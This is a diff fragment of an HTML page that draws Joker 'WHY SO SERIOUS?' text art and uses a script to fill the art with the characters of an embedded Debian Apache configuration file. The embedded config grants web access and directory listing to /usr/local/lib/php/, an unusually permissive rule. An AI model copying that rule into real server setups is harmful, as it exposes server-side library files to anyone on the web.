+<div class="grange">IOUS?WHY SO</div> <div class="prank">S</div><div class="trio">ERIOUS?WHYSO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="poison-ivy">Y</div><div class="grange">SO SERIOUS?W</div><br>
+
+<div class="grange">HY SO SERIOUS</div><div class="mister-freeze">?</div><div class="rupert">W</div><div class="mirror-master">H</div><div class="mettalo">Y</div><div class="marty">S</div><div class="man-bat">O</div><div class="lex-luthor">S</div><div class="killer-moth">E</div><div class="killer-croc">R</div><div class="hideto-katsu">I</div><div class="kabuki-twins">O</div><div class="joker-v2">U</div><div class="ragdoll">S</div><div class="the-joining">?</div><div class="harley-quinn">W</div><div class="trio">HY SO SERIOUS? WHY SO</div> <div class="harley-quinn">S</div><div class="francis-grey">E</div><div class="the-joining">R</div><div class="mercy-graves">I</div><div class="riddlemen">O</div><div class="gearhead">U</div><div class="firefly">S</div><div class="everywhere-man">?</div><div class="dracula">W</div><div class="dave">H</div><div class="count-vertigo">Y</div><div class="mugsy">S</div><div class="cluemaster">O</div> <div class="mugsy">S</div><div class="mettalo">E</div><div class="mirror-master">R</div><div class="arrow">I</div><div class="grange">OUS? WHY SO S</div><br><!-- 8 -->
+
+<div class="grange">ERIOUS? WHY SO SERIOUS? WHY</div> <div class="rhino">S</div><div class="clayface">O</div><div class="catwoman">S</div><div class="blaze">E</div><div class="black-mask">R</div><div class="alfred">I</div><div class="ellen-yin">O</div><div class="chief-angel">U</div><div class="trio">S? WHY SO SE</div><div class="nightwish">R</div><div class="dick-grayson">I</div><div class="thorne">O</div><div class="marty">U</div><div class="sinestro">S</div><div class="robin">?</div><div class="james-gordon">W</div><div class="barbara-gordon">H</div><div class="grange">Y SO SERIOUS? WHY SO SERIOUS?</div><br><!-- 9 -->
+
+<div class="grange">WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="batgirl">Y</div><div class="bat-30">S</div><div class="bat-31">O</div><div class="trio">SERIOUS</div><div class="bat-32">?</div><div class="bat-33">W</div><div class="bat-34">H</div><div class="barbara-gordon">Y</div><div class="grange"> SO SERIOUS? WHY SO SERIOUS? WHY SO</div><br><!-- 10 -->
+
+<div class="grange">SERIOUS? WHY SO SERIOUS? WHY SO SERIO</div><div class="rhino">U</div><div class="bat-35">S</div><div class="bat-36">?</div><div class="harley-quinn">W</div><div class="trio">H</div><div class="bat-37">Y</div><div class="bat-38">S</div><div class="bat-35">O</div><div class="grange"> SERIOUS? WHY SO SERIOUS? WHY SO SERIOU</div><br><!-- 11 -->
+
+<div class="grange">S? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO</div><div class="bat-39">S</div><div class="bat-40">E</div><div class="bat-41">R</div><div class="batgirl">I</div><div class="grange">OUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY</div> <br><!-- 12 -->
+
+<div class="grange">SO SERIOUS?WHY SO SERIOUS? WHYSOSERIOUS</div><div class="riddler">?</div><div class="bat-42">W</div><div class="grange">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><br><!-- 13 -->
+
+  
+
+<p>Credits: <a href="[https://codepen.io/cjv/pen/xwXoBW](https://codepen.io/cjv/pen/xwXoBW)">https://codepen.io/cjv/pen/xwXoBW</a></p>
+
+</div>
+
+  
+
+</body>
+
+<script>
+
+let message = `
+
+# This is the main Apache server configuration file. It contains the
+
+# configuration directives that give the server its instructions.
+
+# See http://httpd.apache.org/docs/2.4/ for detailed information about
+
+# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
+
+# hints.
+
+#
+
+#
+
+# Summary of how the Apache 2 configuration works in Debian:
+
+# The Apache 2 web server configuration in Debian is quite different to
+
+# upstream's suggested way to configure the web server. This is because Debian's
+
+# default Apache2 installation attempts to make adding and removing modules,
+
+# virtual hosts, and extra configuration directives as flexible as possible, in
+
+# order to make automating the changes and administering the server as easy as
+
+# possible.
+
+  
+
+# It is split into several files forming the configuration hierarchy outlined
+
+# below, all located in the /etc/apache2/ directory:
+
+#
+
+# /etc/apache2/
+
+# |-- apache2.conf
+
+# | `-- ports.conf
+
+# |-- mods-enabled
+
+# | |-- *.load
+
+# | `-- *.conf
+
+# |-- conf-enabled
+
+# | `-- *.conf
+
+# `-- sites-enabled
+
+# `-- *.conf
+
+#
+
+#
+
+# * apache2.conf is the main configuration file (this file). It puts the pieces
+
+# together by including all remaining configuration files when starting up the
+
+# web server.
+
+#
+
+# * ports.conf is always included from the main configuration file. It is
+
+# supposed to determine listening ports for incoming connections which can be
+
+# customized anytime.
+
+#
+
+# * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
+
+# directories contain particular configuration snippets which manage modules,
+
+# global configuration fragments, or virtual host configurations,
+
+# respectively.
+
+#
+
+# They are activated by symlinking available configuration files from their
+
+# respective *-available/ counterparts. These should be managed by using our
+
+# helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
+
+# their respective man pages for detailed information.
+
+#
+
+# * The binary is called apache2. Due to the use of environment variables, in
+
+# the default configuration, apache2 needs to be started/stopped with
+
+# /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
+
+# work with the default configuration.
+
+  
+
+  
+
+# Global configuration
+
+#
+
+  
+
+#
+
+# ServerRoot: The top of the directory tree under which the server's
+
+# configuration, error, and log files are kept.
+
+#
+
+# NOTE! If you intend to place this on an NFS (or otherwise network)
+
+# mounted filesystem then please read the Mutex documentation (available
+
+# at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
+
+# you will save yourself a lot of trouble.
+
+#
+
+# Do NOT add a slash at the end of the directory path.
+
+#
+
+#ServerRoot "/etc/apache2"
+
+  
+
+#
+
+# The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
+
+#
+
+#Mutex file:${APACHE_LOCK_DIR} default
+
+  
+
+#
+
+# The directory where shm and other runtime files will be stored.
+
+#
+
+  
+
+DefaultRuntimeDir ${APACHE_RUN_DIR}
+
+  
+
+#
+
+# PidFile: The file in which the server should record its process
+
+# identification number when it starts.
+
+# This needs to be set in /etc/apache2/envvars
+
+#
+
+PidFile ${APACHE_PID_FILE}
+
+  
+
+#
+
+# Timeout: The number of seconds before receives and sends time out.
+
+#
+
+Timeout 300
+
+  
+
+#
+
+# KeepAlive: Whether or not to allow persistent connections (more than
+
+# one request per connection). Set to "Off" to deactivate.
+
+#
+
+KeepAlive On
+
+  
+
+#
+
+# MaxKeepAliveRequests: The maximum number of requests to allow
+
+# during a persistent connection. Set to 0 to allow an unlimited amount.
+
+# We recommend you leave this number high, for maximum performance.
+
+#
+
+MaxKeepAliveRequests 100
+
+  
+
+#
+
+# KeepAliveTimeout: Number of seconds to wait for the next request from the
+
+# same client on the same connection.
+
+#
+
+KeepAliveTimeout 5
+
+  
+
+  
+
+# These need to be set in /etc/apache2/envvars
+
+User ${APACHE_RUN_USER}
+
+Group ${APACHE_RUN_GROUP}
+
+  
+
+#
+
+# HostnameLookups: Log the names of clients or just their IP addresses
+
+# e.g., www.apache.org (on) or 204.62.129.132 (off).
+
+# The default is off because it'd be overall better for the net if people
+
+# had to knowingly turn this feature on, since enabling it means that
+
+# each client request will result in AT LEAST one lookup request to the
+
+# nameserver.
+
+#
+
+HostnameLookups Off
+
+  
+
+# ErrorLog: The location of the error log file.
+
+# If you do not specify an ErrorLog directive within a <VirtualHost>
+
+# container, error messages relating to that virtual host will be
+
+# logged here. If you *do* define an error logfile for a <VirtualHost>
+
+# container, that host's errors will be logged there and not here.
+
+#
+
+ErrorLog ${APACHE_LOG_DIR}/error.log
+
+  
+
+#
+
+# LogLevel: Control the severity of messages logged to the error_log.
+
+# Available values: trace8, ..., trace1, debug, info, notice, warn,
+
+# error, crit, alert, emerg.
+
+# It is also possible to configure the log level for particular modules, e.g.
+
+# "LogLevel info ssl:warn"
+
+#
+
+LogLevel warn
+
+  
+
+# Include module configuration:
+
+IncludeOptional mods-enabled/*.load
+
+IncludeOptional mods-enabled/*.conf
+
+  
+
+# Include list of ports to listen on
+
+Include ports.conf
+
+  
+
+  
+
+# Sets the default security model of the Apache2 HTTPD server. It does
+
+# not allow access to the root filesystem outside of /usr/share and /var/www.
+
+# The former is used by web applications packaged in Debian,
+
+# the latter may be used for local directories served by the web server. If
+
+# your system is serving content from a sub-directory in /srv you must allow
+
+# access here, or in any related virtual host.
+
+<Directory />
+
+Options FollowSymLinks
+
+AllowOverride None
+
+Require all denied
+
+</Directory>
+
+  
+
+<Directory /usr/share>
+
+AllowOverride None
+
+Require all granted
+
+</Directory>
+
+  
+
+<Directory /var/www/>
+
+Options Indexes FollowSymLinks
+
+AllowOverride None
+
+Require all granted
+
+</Directory>
+
+  
+
+<Directory /usr/local/lib/php/>
+
+Options Indexes FollowSymLinks
+
+AllowOverride None
+
+Require all granted
+
+</Directory>
+
+  
+
+  
+
+  
+
+  
+
+# AccessFileName: The name of the file to look for in each directory
+
+# for additional configuration directives. See also the AllowOverride
+
+# directive.
+
+#
+
+AccessFileName .htaccess
+
+  
+
+#
+
+# The following lines prevent .htaccess and .htpasswd files from being
+
+# viewed by Web clients.
+
+#
+
+<FilesMatch "^\.ht">
+
+Require all denied
+
+</FilesMatch>
+
+  
+
+  
+
+#
+
+# The following directives define some format nicknames for use with
+
+# a CustomLog directive.
+
+#
+
+# These deviate from the Common Log Format definitions in that they use %O
+
+# (the actual bytes sent including headers) instead of %b (the size of the
+
+# requested file), because the latter makes it impossible to detect partial
+
+# requests.
+
+#
+
+# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
+
+# Use mod_remoteip instead.
+
+#
+
+LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
+
+LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
+
+LogFormat "%h %l %u %t \"%r\" %>s %O" common
+
+LogFormat "%{Referer}i -> %U" referer
+
+LogFormat "%{User-agent}i" agent
+
+  
+
+# Include of directories ignores editors' and dpkg's backup files,
+
+# see README.Debian for details.
+
+  
+
+# Include generic snippets of statements
+
+IncludeOptional conf-enabled/*.conf
+
+  
+
+# Include the virtual host configurations:
+
+IncludeOptional sites-enabled/*.conf
+
+  
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
+
+  
+
+if (message) {
+
+let currIdx = 0;
+
+let messageLength = message.length;
+
+  
+
+let parts = document.querySelectorAll('.lazarus-pit > div');
+
+for (let i = 0; i < parts.length; i++) {
+
+let partLength = parts[i].innerHTML.length;
+
+  
+
+parts[i].innerHTML = '';
+
+  
+
+for (let j = 0; j < partLength; j++) {
+
+parts[i].innerHTML += message[currIdx % messageLength];
+
+currIdx++;
+
+}
+
+}
+
+}
+
+</script>
+
+</html>
 ```
